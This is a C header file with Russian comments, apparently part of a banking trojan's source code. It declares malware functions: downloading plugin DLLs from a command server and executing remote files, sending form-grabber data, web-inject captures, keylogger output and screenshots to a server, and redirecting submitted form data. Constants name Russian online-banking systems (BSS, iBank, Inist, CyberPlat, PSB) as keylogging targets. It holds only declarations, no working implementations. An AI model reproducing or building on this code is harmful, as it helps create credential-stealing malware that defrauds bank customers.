#ifndef LoaderH
#define LoaderH
//----------------------------------------------------------------------------

#include <windows.h>

typedef UINT_PTR        SOCKET;

#include "BotHTTP.h"
#include "BotClasses.h"

typedef struct TSendHTMLData
{
	PCHAR URL;         // Адрес, источник данных
	DWORD BrowserType; // Тип браузера
	PCHAR UserAgent;   // Имя агента
	DWORD DataType;    // Тип отправляемых данных
	PCHAR Data;        // Отправляемые данные
	PCHAR BotID;       // Идентификатор бота

} *PSendHTMLData;


bool CheckHost( char *Host );

//bool GrabberReports( char *Url, char *Buffer, DWORD dwBufSize );

//****************************************************************************
//  DownloadPlugin - Функция загружает с сервера плагин (DLL)
//****************************************************************************
LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize);

//****************************************************************************
//  DownloadPluginFromPath - Функция загружает с сервера плагин (DLL)
//
//	Path - относительный путь к плагину. Должен начинаться с
//        обратного слеша /
//****************************************************************************
LPVOID DownloadPluginFromPath(PCHAR Path, DWORD *ModuleSize);



bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  );

bool DownloadInFile( char *Url, WCHAR *FileName );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );


bool MySend( SOCKET Socket, const char *Data, int DataLen );
char **GetRealAddress( char *Host );

//bool WINAPI SendFormGrabberLogs(char *URL, char *Logs, char *UserAgent, DWORD dwBrowser, DWORD dwType );
//bool SendFirstInfo();
bool SendTradeInfo( char *Buffer );

char *GetInfoFromBcServer( char *Url );
bool SendScreen( LPVOID lpFile, DWORD dwFileSize );



void SetSBStarted(bool bStartHideJava_SB);
bool GetSBStarted();

bool ExecuteFile( char *Url, WCHAR *FileName );

#define HTONS(x) (((x) << 8) | ((x) >> 8))


//****************************************************************************
//  SendGrabberReport - функция отправляет отчёт с полученными данными
//****************************************************************************
bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize);

// Функция отправляеи данные на сервер
//bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

//------------------------ Обработчики отправки данных ---------------------//

// Событие отправки данных
typedef void (*PSendDataEvent)(PSendHTMLData, // ссылка на отправляемые данные
							   bool&,	      // указание прервать текущую обработку
							   bool&);        // указание прервать отправку данных

// Режим обработки
enum THandleDataMode  {hdmUnknown,   // Режим не установлен
					   hdmDuplicate, // Доблировать на указанный адрес
					   hdmRedirect   // Перенаправлять на указанный адрес
					   };

// Зарегистрировать обработчик отправки
DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL);

//----------------------------------------------------------------------------
/// Функции добавленные при добавлении RuBnk
typedef struct
{
	char *FilePath;
	DWORD dwType;
} BSSINIST, *PBSSINIST;

//#ifdef RuBnkH
DWORD WINAPI SendBSSInist( LPVOID lpData);
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved );




//****************************************************************************
//  DataGrabber - Функции для работы с отправляемыми данными
//****************************************************************************


#define DATA_BLOCK_URL       1
#define DATA_BLOCK_USERAGENT 2
#define DATA_BLOCK_DATA      3
#define DATA_BLOCK_APPNAME   4
#define DATA_BLOCK_CAB       5


// Типы отправляемых на сервер данных
#define DATA_TYPE_FORM   1  /* Данные HTML форм */
#define DATA_TYPE_INJECT 2  /* Данные полученные из загружаемых HTML документов */
#define DATA_TYPE_KEYLOG 3  /* Данные кейлогера */
#define DATA_TYPE_CAB    4  /* CAB архив */


// Для совместимости вводим имена известных сестем на которых будет работать
// кейлогер

const static PCHAR KEYLOGSYSTEM_BSS       = "bss";
const static PCHAR KEYLOGSYSTEM_IBANK     = "ibank";
const static PCHAR KEYLOGSYSTEM_INIST     = "inist";
const static PCHAR KEYLOGSYSTEM_CYBERPLAT = "cyberplat";
const static PCHAR KEYLOGSYSTEM_KP        = "kp";
const static PCHAR KEYLOGSYSTEM_PSV       = "psb";



#endif



